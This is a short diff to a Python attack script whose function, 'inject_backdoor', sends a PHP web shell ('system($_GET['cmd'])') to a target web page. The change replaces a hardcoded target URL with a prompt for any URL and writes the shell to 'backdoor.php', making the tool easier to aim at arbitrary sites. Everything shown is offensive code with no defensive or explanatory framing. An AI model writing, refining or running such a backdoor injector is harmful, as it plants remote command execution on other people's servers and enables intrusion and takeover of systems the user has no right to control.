@@ -1,7 +1,7 @@
 import requests
 
 def inject_backdoor(file_path, backdoor_code):
-    url = "http://target-website.com/your-vulnerable-page.php"
+    url = input("Target url: ")
     
     payload = "<?php " + backdoor_code + " ?>"
     
@@ -14,7 +14,7 @@ def inject_backdoor(file_path, backdoor_code):
     else:
         print("Injection failed.")
 
-file_path = "/var/www/html/index.php"
+file_path = "backdoor.php"
 backdoor_code = "system($_GET['cmd']);"
 
 inject_backdoor(file_path, backdoor_code)
